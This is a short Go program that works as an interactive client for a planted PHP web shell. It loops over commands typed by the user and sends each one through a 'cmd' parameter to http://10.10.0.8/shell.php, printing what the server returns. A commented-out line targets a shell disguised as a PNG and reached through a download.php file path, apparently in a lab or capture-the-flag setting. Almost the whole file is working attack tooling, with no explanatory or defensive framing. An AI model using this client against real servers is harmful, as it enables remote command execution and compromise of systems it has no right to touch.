package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {

	// host := "http://10.10.0.4/download.php?fid=./files/1824399861/shell.png&cmd="
	host := "http://10.10.0.8/shell.php?cmd="

	reader := bufio.NewReader(os.Stdin)

	for i := 0; i < 1000; i++ {

		fmt.Print("shell: ")

		input, _ := reader.ReadString('\n')
		input = input[:len(input)-1]

		// fmt.Println(input)
		if input == "exit" {
			os.Exit(0)
		}

		res, err := http.Get(host + input)

		body, err := ioutil.ReadAll(res.Body)

		fmt.Println(string(body))
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		defer res.Body.Close()

	}

}
